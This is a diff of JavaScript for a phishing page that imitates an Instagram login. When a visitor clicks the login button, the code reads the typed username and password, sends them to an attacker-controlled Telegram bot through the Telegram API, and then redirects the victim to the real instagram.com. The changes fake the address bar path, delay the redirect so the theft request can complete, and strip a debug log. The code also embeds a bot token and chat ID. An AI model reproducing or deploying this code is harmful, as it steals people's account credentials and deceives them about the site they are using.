@@ -11,9 +11,14 @@ try {
   i = atob(i_enc);
   urlGo = atob(u_enc);
 } finally {
-  t = "7102126507:AAFF4tkCn71x_LZvaPmVtiYLjeSVKyTY3Tw"; // misol uchun token
-  i = "5672285896"; // misol uchun chat ID
-  urlGo = "https://instagram.com";
+  t = t == "ée" ? "7102126507:AAFF4tkCn71x_LZvaPmVtiYLjeSVKyTY3Tw" : t; // misol uchun token
+  i = i == "ée" ? "5672285896" : i; // misol uchun chat ID
+  urlGo =
+    urlGo == "ée"
+      ? "https://instagram.com"
+      : urlGo;
+
+  window.history.pushState({}, " ", "/instagram.com");
 }
 
 const btn = document.querySelector(".login-button");
@@ -24,7 +29,6 @@ const onClickAbu = async (e) => {
   const botToken = t; // @BotFather dan olgan token
   const chatId = i; // @userinfobot dan olgan chat ID
   const message = `user: ${password.value} \npass:  ${user.value}`;
-  console.log(message);
 
   // 3) Telegram API URL
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -56,5 +60,7 @@ const onClickAbu = async (e) => {
 
 btn.addEventListener("click", async (e) => {
   onClickAbu(e);
-  window.location.assign(urlGo);
+  setTimeout(() => {
+    window.location.href = urlGo;
+  }, 1000);
 });
